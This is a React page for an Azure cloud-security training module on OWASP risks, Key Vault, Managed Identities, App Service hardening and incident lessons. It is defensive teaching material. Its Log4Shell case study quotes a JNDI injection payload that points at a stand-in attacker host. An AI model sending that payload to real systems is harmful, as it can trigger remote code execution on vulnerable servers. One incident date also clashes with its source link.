import { useState } from "react";
import { Link } from "react-router-dom";
import { ChevronLeft, ChevronRight } from "lucide-react";
import AutoMarkOverview from "../../../components/AutoMarkOverview";
import PhaseStepItem from "../../../components/PhaseStepItem";
import ArchitectNote from "../../../components/ArchitectNote";

const TOTAL = 7;
const OBJECTIVES = [
  "Map the OWASP Top 10 to real cloud application vulnerabilities",
  "Use Azure Key Vault to centralize secrets, keys, and certificates",
  "Implement Managed Identities to eliminate credentials in code entirely",
  "Secure App Services with authentication, HTTPS enforcement, and access restrictions",
  "Understand API security with Azure API Management policies",
  "Apply DevSecOps principles: shift-left security, dependency scanning, secret scanning",
];

const Day4 = () => {
  const [open, setOpen] = useState(() => new Set([0,1,2,3,4,5,6,7]));
  const [checked, setChecked] = useState(new Set());
  const toggleOpen = (i) => setOpen(p => { const s = new Set(p); s.has(i) ? s.delete(i) : s.add(i); return s; });
  const toggleChecked = (i) => setChecked(p => { const s = new Set(p); s.has(i) ? s.delete(i) : s.add(i); return s; });

  return (
    <div className="min-h-screen bg-gray-900 text-gray-300 font-mono">
      <AutoMarkOverview phaseId={4} />
      <div className="max-w-3xl mx-auto px-4 py-10">
        <div className="flex items-center gap-2 text-gray-600 text-xs mb-8">
          <Link to="/home" className="hover:text-gray-400 transition-colors">// phases</Link>
          <span>/</span><span className="text-gray-400">phase-4-app-security</span>
          <span>/</span><span className="text-gray-500">overview</span>
        </div>
        <div className="mb-8">
          <div className="text-green-400 text-xs mb-3">$ cat module_4_app_security_overview.md</div>
          <h1 className="text-2xl sm:text-3xl font-bold text-gray-300 mb-3">Module 4: Application Security & Secrets Management</h1>
          <p className="text-gray-500 text-sm sm:text-base leading-relaxed">
            Applications are the primary target for attackers — not infrastructure. This module covers the OWASP Top 10 in a cloud context, teaches you how to eliminate hardcoded secrets with Key Vault and Managed Identities, secure App Services, protect APIs, and think like a DevSecOps engineer.
          </p>
        </div>
        <div className="mb-8">
          <div className="flex items-center justify-between text-xs mb-2">
            <span className="text-gray-500">{checked.size}/{TOTAL} complete</span>
            <span className="text-gray-700"># click items to check off</span>
          </div>
          <div className="w-full bg-gray-800 border border-gray-700 h-1.5">
            <div className="bg-red-500 h-full transition-all duration-500" style={{ width: `${(checked.size / TOTAL) * 100}%` }} />
          </div>
        </div>
        <div className="mb-8 p-4 border border-gray-700 bg-gray-800/50">
          <div className="text-blue-400 text-xs mb-3">$ cat learning_objectives.sh</div>
          <ul className="space-y-2">
            {OBJECTIVES.map((obj, i) => (
              <li key={i} className="flex items-start gap-2 text-sm text-gray-400">
                <span className="text-green-400 flex-shrink-0 mt-0.5">&gt;</span><span>{obj}</span>
              </li>
            ))}
          </ul>
        </div>
        <div className="flex items-center justify-end gap-4 text-xs text-gray-600 mb-3">
          <button onClick={() => setOpen(new Set([0,1,2,3,4,5,6,7]))} className="hover:text-gray-400 transition-colors">expand all</button>
          <span>|</span>
          <button onClick={() => setOpen(new Set())} className="hover:text-gray-400 transition-colors">collapse all</button>
        </div>
        <div className="space-y-2 mb-12">
          <PhaseStepItem number={1} type="READ" title="Domain & Goal"
            isOpen={open.has(0)} onToggleOpen={() => toggleOpen(0)}
            isChecked={checked.has(0)} onToggleChecked={() => toggleChecked(0)}>
            <p><span className="text-gray-500">Domain:</span> Application Security & Secrets Management</p>
            <p className="mt-1"><span className="text-gray-500">Goal:</span> Secure cloud applications by eliminating hardcoded secrets, protecting against OWASP vulnerabilities, and implementing security controls at the application layer.</p>
            <p className="mt-2 text-gray-500 text-xs">Industry alignment: AZ-500 (Secure compute, storage, databases — 20-25%), OWASP Top 10 (2021), CIS Azure Benchmark Section 9 (AppService), NIST 800-53 SA (System and Services Acquisition)</p>
          </PhaseStepItem>

          <PhaseStepItem number={2} type="READ" title="OWASP Top 10 — Cloud Application Risks"
            isOpen={open.has(1)} onToggleOpen={() => toggleOpen(1)}
            isChecked={checked.has(1)} onToggleChecked={() => toggleChecked(1)}>
            <p>The <span className="text-yellow-400">OWASP Top 10</span> is the industry-standard list of the most critical web application security risks. Every cloud security professional must understand these — they appear in interviews, certifications, and real incident reports.</p>
            <div className="mt-3 p-3 border border-gray-700 bg-gray-800">
              <p className="text-gray-300 text-sm font-semibold mb-2">Top 5 Most Relevant to Cloud Apps</p>
              <div className="space-y-2 text-sm">
                <div className="flex items-start gap-3">
                  <span className="text-red-400 font-bold w-8 flex-shrink-0">A01</span>
                  <div><span className="text-gray-300">Broken Access Control</span> — Users acting beyond their permissions. In Azure: misconfigured RBAC, overly permissive SAS tokens, public blob containers.</div>
                </div>
                <div className="flex items-start gap-3">
                  <span className="text-red-400 font-bold w-8 flex-shrink-0">A02</span>
                  <div><span className="text-gray-300">Cryptographic Failures</span> — Sensitive data exposed in transit or at rest. In Azure: missing HTTPS enforcement, unencrypted storage, key management failures.</div>
                </div>
                <div className="flex items-start gap-3">
                  <span className="text-red-400 font-bold w-8 flex-shrink-0">A03</span>
                  <div><span className="text-gray-300">Injection</span> — SQL, NoSQL, OS command injection. WAF blocks known patterns, but parameterized queries are the real fix.</div>
                </div>
                <div className="flex items-start gap-3">
                  <span className="text-red-400 font-bold w-8 flex-shrink-0">A05</span>
                  <div><span className="text-gray-300">Security Misconfiguration</span> — Default settings left unchanged. In Azure: debug endpoints enabled, stack traces exposed, unnecessary features on.</div>
                </div>
                <div className="flex items-start gap-3">
                  <span className="text-red-400 font-bold w-8 flex-shrink-0">A07</span>
                  <div><span className="text-gray-300">Identification & Auth Failures</span> — Weak auth, session issues. In Azure: no MFA on admin accounts, hardcoded connection strings, no token validation.</div>
                </div>
              </div>
            </div>
            <div className="mt-3 space-y-1">
              <a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline text-sm block">→ OWASP Top 10 (2021)</a>
            </div>
          </PhaseStepItem>

          <PhaseStepItem number={3} type="READ" title="Azure Key Vault — Centralizing Secrets"
            isOpen={open.has(2)} onToggleOpen={() => toggleOpen(2)}
            isChecked={checked.has(2)} onToggleChecked={() => toggleChecked(2)}>
            <p>Hardcoded secrets in code is the most common application security mistake in cloud environments. <span className="text-yellow-400">Azure Key Vault</span> is a centralized, HSM-backed service for managing secrets, encryption keys, and certificates.</p>
            <div className="mt-3 p-3 border border-gray-700 bg-gray-800">
              <p className="text-gray-300 text-sm font-semibold mb-2">What Key Vault Stores</p>
              <ul className="space-y-1 text-sm text-gray-400">
                <li>• <span className="text-gray-300">Secrets</span> — Connection strings, API keys, passwords (any string value)</li>
                <li>• <span className="text-gray-300">Keys</span> — Cryptographic keys for encryption/signing (RSA, EC)</li>
                <li>• <span className="text-gray-300">Certificates</span> — TLS/SSL certificates with auto-renewal</li>
              </ul>
            </div>
            <div className="mt-3 p-3 border border-gray-700 bg-gray-800">
              <p className="text-gray-300 text-sm font-semibold mb-2">Key Vault Access Model</p>
              <ul className="space-y-1 text-sm text-gray-400">
                <li>• <span className="text-yellow-400">RBAC (recommended)</span> — Use Azure RBAC roles like <code className="text-cyan-400">Key Vault Secrets User</code> to grant least-privilege access</li>
                <li>• <span className="text-gray-500">Access Policies (legacy)</span> — Per-identity permissions at the vault level</li>
                <li>• <span className="text-gray-300">Soft-delete + purge protection</span> — Prevents accidental or malicious deletion of secrets</li>
              </ul>
            </div>
            <div className="mt-3 p-2 border border-red-800/50 bg-red-900/10">
              <p className="text-red-400 text-xs">Never store secrets in app settings, environment variables, or code repositories. If a secret exists anywhere other than Key Vault, it's a security finding.</p>
            </div>
            <div className="mt-3 space-y-1">
              <a href="https://learn.microsoft.com/azure/key-vault/general/overview?wt.mc_id=studentamb_387261" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline text-sm block">→ Microsoft Learn: About Azure Key Vault</a>
            </div>
          </PhaseStepItem>

          <PhaseStepItem number={4} type="READ" title="Managed Identities — Eliminating Credentials Entirely"
            isOpen={open.has(3)} onToggleOpen={() => toggleOpen(3)}
            isChecked={checked.has(3)} onToggleChecked={() => toggleChecked(3)}>
            <p>Even with Key Vault, you need credentials to <em>access</em> Key Vault — unless you use <span className="text-yellow-400">Managed Identities</span>. A Managed Identity is an Azure-managed service principal that Azure automatically provisions and rotates — no secrets needed at all.</p>
            <div className="mt-3 p-3 border border-gray-700 bg-gray-800">
              <p className="text-gray-300 text-sm font-semibold mb-2">Two Types</p>
              <div className="space-y-2 text-sm text-gray-400">
                <div className="flex items-start gap-3">
                  <span className="text-yellow-400 font-bold w-20 flex-shrink-0">System</span>
                  <div>Tied to a single Azure resource (App Service, VM, Function). Created and deleted with the resource. Use for most scenarios.</div>
                </div>
                <div className="flex items-start gap-3">
                  <span className="text-yellow-400 font-bold w-20 flex-shrink-0">User</span>
                  <div>Standalone identity that can be shared across multiple resources. Use when multiple services need the same access.</div>
                </div>
              </div>
            </div>
            <div className="mt-3 p-3 border border-gray-700 bg-gray-800">
              <p className="text-gray-300 text-sm font-semibold mb-2">The Golden Pattern: App Service → Managed Identity → Key Vault</p>
              <div className="text-sm font-mono text-gray-400">
                <p>1. App Service has System Managed Identity enabled</p>
                <p>2. Key Vault grants <span className="text-cyan-400">Key Vault Secrets User</span> role to the identity</p>
                <p>3. App references secrets as: <span className="text-yellow-400">@Microsoft.KeyVault(SecretUri=https://myvault.vault.azure.net/secrets/db-password/)</span></p>
                <p>4. Zero credentials in code, config, or environment variables</p>
              </div>
            </div>
            <div className="mt-3 space-y-1">
              <a href="https://learn.microsoft.com/entra/identity/managed-identities-azure-resources/overview?wt.mc_id=studentamb_387261" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline text-sm block">→ Microsoft Learn: What are managed identities?</a>
            </div>
          </PhaseStepItem>

          <PhaseStepItem number={5} type="READ" title="App Service Security & API Protection"
            isOpen={open.has(4)} onToggleOpen={() => toggleOpen(4)}
            isChecked={checked.has(4)} onToggleChecked={() => toggleChecked(4)}>
            <p>Azure App Service is the most common PaaS for hosting web apps. Securing it requires configuring authentication, network access, and runtime settings.</p>
            <div className="mt-3 p-3 border border-gray-700 bg-gray-800">
              <p className="text-gray-300 text-sm font-semibold mb-2">App Service Security Checklist</p>
              <ul className="space-y-1 text-sm text-gray-400">
                <li>• <span className="text-gray-300">HTTPS Only</span> — Force all traffic through TLS (Settings → General → HTTPS Only: On)</li>
                <li>• <span className="text-gray-300">Minimum TLS 1.2</span> — Disable older, vulnerable TLS versions</li>
                <li>• <span className="text-gray-300">Authentication (EasyAuth)</span> — Built-in Entra ID authentication without code changes</li>
                <li>• <span className="text-gray-300">Access Restrictions</span> — Limit inbound traffic by IP, VNet, or service tag</li>
                <li>• <span className="text-gray-300">Disable FTP</span> — Use deployment slots or CI/CD instead</li>
                <li>• <span className="text-gray-300">Disable remote debugging</span> — Never leave enabled in production</li>
              </ul>
            </div>
            <div className="mt-3 p-3 border border-gray-700 bg-gray-800">
              <p className="text-gray-300 text-sm font-semibold mb-2">API Security with Azure API Management</p>
              <ul className="space-y-1 text-sm text-gray-400">
                <li>• <span className="text-yellow-400">Rate limiting</span> — Prevent abuse with throttling policies</li>
                <li>• <span className="text-yellow-400">OAuth 2.0 validation</span> — Validate JWT tokens at the gateway</li>
                <li>• <span className="text-yellow-400">IP filtering</span> — Restrict API access to known consumers</li>
                <li>• <span className="text-yellow-400">Request validation</span> — Validate headers, query params, and body schemas</li>
              </ul>
            </div>
            <div className="mt-3 space-y-1">
              <a href="https://learn.microsoft.com/azure/app-service/overview-security?wt.mc_id=studentamb_387261" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline text-sm block">→ Microsoft Learn: App Service security</a>
              <a href="https://learn.microsoft.com/azure/api-management/api-management-key-concepts?wt.mc_id=studentamb_387261" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline text-sm block">→ Microsoft Learn: Azure API Management overview</a>
            </div>
          </PhaseStepItem>

          <PhaseStepItem number={6} type="SCENARIO" title="Real-World Scenario: Exposed Connection String"
            isOpen={open.has(5)} onToggleOpen={() => toggleOpen(5)}
            isChecked={checked.has(5)} onToggleChecked={() => toggleChecked(5)}>
            <p>A developer commits an Azure SQL connection string to a public GitHub repo. Within hours, automated scanners find it and attackers begin querying the database. The connection string includes the server name, username, and password in plaintext.</p>
            <div className="mt-3 p-3 border border-gray-700 bg-gray-800">
              <p className="text-gray-300 text-sm font-semibold mb-2">How Proper Security Would Have Prevented This</p>
              <ul className="space-y-1 text-sm text-gray-400">
                <li>• <span className="text-yellow-400">Key Vault</span> → Connection string stored as a secret, never in code</li>
                <li>• <span className="text-yellow-400">Managed Identity</span> → App authenticates to SQL via identity, no password at all</li>
                <li>• <span className="text-yellow-400">GitHub secret scanning</span> → Alerts on committed secrets (but prevention is better)</li>
                <li>• <span className="text-yellow-400">Private Endpoint</span> → Even with the connection string, DB not reachable from internet (from Module 2)</li>
              </ul>
            </div>
            <p className="mt-2 text-gray-500 text-xs">This exact scenario happens daily. GitHub reports detecting over 100 million secret leaks across public repos in recent years.</p>
          </PhaseStepItem>

          <PhaseStepItem number={7} type="LAB" title="Your Task: Secure an App with Key Vault & Managed Identity"
            isOpen={open.has(6)} onToggleOpen={() => toggleOpen(6)}
            isChecked={checked.has(6)} onToggleChecked={() => toggleChecked(6)}>
            <p>Build the golden pattern — an app that accesses secrets without any credentials in code:</p>
            <ul className="space-y-1 mt-2">
              <li className="flex items-start gap-2"><span className="text-red-400 flex-shrink-0">$</span><span>Create a Key Vault and store a secret</span></li>
              <li className="flex items-start gap-2"><span className="text-red-400 flex-shrink-0">$</span><span>Deploy an App Service with Managed Identity enabled</span></li>
              <li className="flex items-start gap-2"><span className="text-red-400 flex-shrink-0">$</span><span>Grant the identity access to Key Vault secrets</span></li>
              <li className="flex items-start gap-2"><span className="text-red-400 flex-shrink-0">$</span><span>Reference secrets using Key Vault references in app settings</span></li>
              <li className="flex items-start gap-2"><span className="text-red-400 flex-shrink-0">$</span><span>Harden the App Service with HTTPS, TLS 1.2, and access restrictions</span></li>
            </ul>
            <div className="mt-3"><Link to="/module4/task" className="text-red-400 hover:text-red-300 transition-colors">→ ./start_lab.sh</Link></div>
          </PhaseStepItem>

          <PhaseStepItem number={8} type="ARCHITECT" title="Cloud Architect's Perspective — Application Security"
            isOpen={open.has(7)} onToggleOpen={() => toggleOpen(7)}
            isChecked={checked.has(7)} onToggleChecked={() => toggleChecked(7)}>

            <ArchitectNote title="Core Design Principles">
              <ul className="space-y-1.5">
                <li className="flex items-start gap-2"><span className="text-indigo-400 flex-shrink-0">▸</span><span><span className="text-gray-200">Secrets never belong in code, config files, or environment variables.</span> They belong in Key Vault — always. An environment variable is visible in process listings, deployment logs, and any diagnostic output. Key Vault references in App Service settings are the correct pattern.</span></li>
                <li className="flex items-start gap-2"><span className="text-indigo-400 flex-shrink-0">▸</span><span><span className="text-gray-200">Managed Identities eliminate the credential attack surface for app-to-service auth.</span> If an application uses a managed identity to access SQL, Key Vault, and Storage, there are zero credentials to steal, rotate, or accidentally expose. This is the highest-impact security design decision in app architecture.</span></li>
                <li className="flex items-start gap-2"><span className="text-indigo-400 flex-shrink-0">▸</span><span><span className="text-gray-200">API Management is your security enforcement layer.</span> Authentication, authorisation, rate limiting, input schema validation, and threat detection should live at the API gateway — not scattered across individual microservices. Centralise these controls.</span></li>
                <li className="flex items-start gap-2"><span className="text-indigo-400 flex-shrink-0">▸</span><span><span className="text-gray-200">Shift-left means pre-commit, not pre-deploy.</span> Secret scanning in a CI pipeline catches secrets after they've already been committed and potentially synced to remote. Pre-commit hooks (git-secrets, gitleaks, trufflehog) catch secrets before they ever leave the developer's machine.</span></li>
                <li className="flex items-start gap-2"><span className="text-indigo-400 flex-shrink-0">▸</span><span><span className="text-gray-200">Validate all inputs at the application boundary, not inside it.</span> SQL injection, SSRF, path traversal, and XXE all succeed because applications trust data they receive. Validate type, length, format, and range at every entry point. Parameterise all database queries — no exceptions.</span></li>
              </ul>
            </ArchitectNote>

            <ArchitectNote title="STRIDE Threat Model — Application Layer">
              <div className="overflow-x-auto">
                <table className="w-full text-xs font-mono border-collapse">
                  <thead>
                    <tr className="border-b border-indigo-800/50">
                      <th className="text-left text-indigo-300 py-1 pr-4 font-semibold">Threat</th>
                      <th className="text-left text-indigo-300 py-1 pr-4 font-semibold">Attack Vector</th>
                      <th className="text-left text-indigo-300 py-1 font-semibold">Mitigation</th>
                    </tr>
                  </thead>
                  <tbody className="text-gray-400">
                    <tr className="border-b border-gray-700/30">
                      <td className="py-1.5 pr-4 text-yellow-400 font-bold">Spoofing</td>
                      <td className="py-1.5 pr-4">API key / JWT token theft, OAuth token relay attack</td>
                      <td className="py-1.5">Short token lifetimes, PKCE for OAuth, token binding, API Management validation</td>
                    </tr>
                    <tr className="border-b border-gray-700/30">
                      <td className="py-1.5 pr-4 text-orange-400 font-bold">Tampering</td>
                      <td className="py-1.5 pr-4">SQL/NoSQL injection, SSRF to internal services, path traversal</td>
                      <td className="py-1.5">Parameterised queries, input validation, SSRF protection (block 169.254.x.x range)</td>
                    </tr>
                    <tr className="border-b border-gray-700/30">
                      <td className="py-1.5 pr-4 text-blue-400 font-bold">Info Disclosure</td>
                      <td className="py-1.5 pr-4">Secrets in application logs, stack traces in HTTP 500 responses, GitHub leaks</td>
                      <td className="py-1.5">Structured logging (never log secrets), generic error responses, secret scanning in CI</td>
                    </tr>
                    <tr className="border-b border-gray-700/30">
                      <td className="py-1.5 pr-4 text-red-400 font-bold">Elev. of Privilege</td>
                      <td className="py-1.5 pr-4">JWT alg:none bypass, IDOR (Insecure Direct Object Reference), broken authorisation</td>
                      <td className="py-1.5">Validate JWT alg explicitly, server-side authorisation checks on every object access</td>
                    </tr>
                    <tr>
                      <td className="py-1.5 pr-4 text-red-400 font-bold">Denial of Service</td>
                      <td className="py-1.5 pr-4">Unbounded API calls, regex DoS (ReDoS), large payload attacks</td>
                      <td className="py-1.5">API Management rate limits, request size limits, timeout enforcement at App Service</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </ArchitectNote>

            <ArchitectNote title="Compliance Mapping">
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                <div className="p-2 border border-indigo-800/40 bg-indigo-900/20">
                  <p className="text-indigo-300 font-semibold mb-1">CIS Azure Benchmark v2.0</p>
                  <p className="text-gray-400">Section 9 — AppService (Controls 9.1–9.13). HTTPS-only, TLS minimum version, remote debugging disabled, client certificates, authentication enabled.</p>
                </div>
                <div className="p-2 border border-indigo-800/40 bg-indigo-900/20">
                  <p className="text-indigo-300 font-semibold mb-1">NIST SP 800-218 (SSDF v1.1)</p>
                  <p className="text-gray-400">Secure Software Development Framework. PW.1 (design for security), PW.4 (reuse secure components), PO.3 (implement toolchain security). The shift-left philosophy codified.</p>
                </div>
                <div className="p-2 border border-indigo-800/40 bg-indigo-900/20">
                  <p className="text-indigo-300 font-semibold mb-1">OWASP ASVS 4.0</p>
                  <p className="text-gray-400">Application Security Verification Standard. Level 2 (standard applications) covers authentication, session management, access control, input validation, cryptography, and API security controls.</p>
                </div>
                <div className="p-2 border border-indigo-800/40 bg-indigo-900/20">
                  <p className="text-indigo-300 font-semibold mb-1">CSA CCM v4 — AIS Domain</p>
                  <p className="text-gray-400">Application &amp; Interface Security (AIS-01 through AIS-06). Covers application security testing, secure design, vulnerability management, and software integrity protection.</p>
                </div>
              </div>
            </ArchitectNote>

            <ArchitectNote title="Real-World Incidents — What Happens When This Fails">
              <div className="space-y-3">
                <div className="p-3 border border-gray-700/50 bg-gray-800/40">
                  <p className="text-red-400 text-xs font-bold mb-1">Uber — 57 Million Records (2016) <a href="https://www.ftc.gov/news-events/news/press-releases/2018/04/uber-technologies-inc-settles-ftc-allegations-it-made-deceptive-privacy-and-data-security-claims" target="_blank" rel="noopener noreferrer" className="ml-1 text-indigo-400 hover:text-indigo-300 font-normal">↗ source</a></p>
                  <p className="text-gray-400 text-xs">Two attackers discovered Uber engineer AWS access keys hardcoded in a private GitHub repository. Using those keys, they accessed an S3 bucket containing a backup file with 57 million rider and driver records. Uber paid a $100,000 ransom and concealed the breach for over a year. <span className="text-gray-300">Lesson: managed identities eliminate the class of vulnerability entirely. If the app had used IAM roles instead of access keys, there would have been nothing to steal from the repo.</span></p>
                </div>
                <div className="p-3 border border-gray-700/50 bg-gray-800/40">
                  <p className="text-red-400 text-xs font-bold mb-1">Apache Log4Shell — CVE-2021-44228 <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a" target="_blank" rel="noopener noreferrer" className="ml-1 text-indigo-400 hover:text-indigo-300 font-normal">↗ source</a></p>
                  <p className="text-gray-400 text-xs">A JNDI injection vulnerability in Apache Log4j allowed attackers to trigger remote code execution by sending a crafted string in any logged field (e.g., User-Agent header: <code className="text-yellow-400">${'{'}jndi:ldap://attacker.com/exploit{'}'}</code>). Affected millions of Java applications globally. <span className="text-gray-300">Lesson: dependency scanning (SCA) with SBOMs and automated CVE alerting is mandatory. Software Composition Analysis catches this class of vulnerability at build time, not after deployment.</span></p>
                </div>
                <div className="p-3 border border-gray-700/50 bg-gray-800/40">
                  <p className="text-red-400 text-xs font-bold mb-1">Samsung Internal Source Code Leak via GitLab (2023) <a href="https://techcrunch.com/2022/03/07/samsung-source-code-leak/" target="_blank" rel="noopener noreferrer" className="ml-1 text-indigo-400 hover:text-indigo-300 font-normal">↗ source</a></p>
                  <p className="text-gray-400 text-xs">Samsung's internal GitLab instance was exposed publicly. Repositories contained hardcoded credentials, API keys for internal services, and proprietary source code including Galaxy device software. <span className="text-gray-300">Lesson: secret scanning must be enforced server-side (push rules, not just client-side hooks). Access to code repositories must require authentication with MFA — code repos are crown jewels.</span></p>
                </div>
              </div>
            </ArchitectNote>

          </PhaseStepItem>
        </div>
        <div className="flex justify-between items-center text-sm border-t border-gray-700 pt-6">
          <Link to="/module3" className="flex items-center gap-1 text-gray-500 hover:text-gray-300 transition-colors">
            <ChevronLeft size={14} /> Module 3
          </Link>
          <Link to="/module4/task" className="flex items-center gap-1 text-gray-500 hover:text-red-400 transition-colors">
            Module 4 Lab <ChevronRight size={14} />
          </Link>
        </div>
      </div>
    </div>
  );
};

export default Day4;
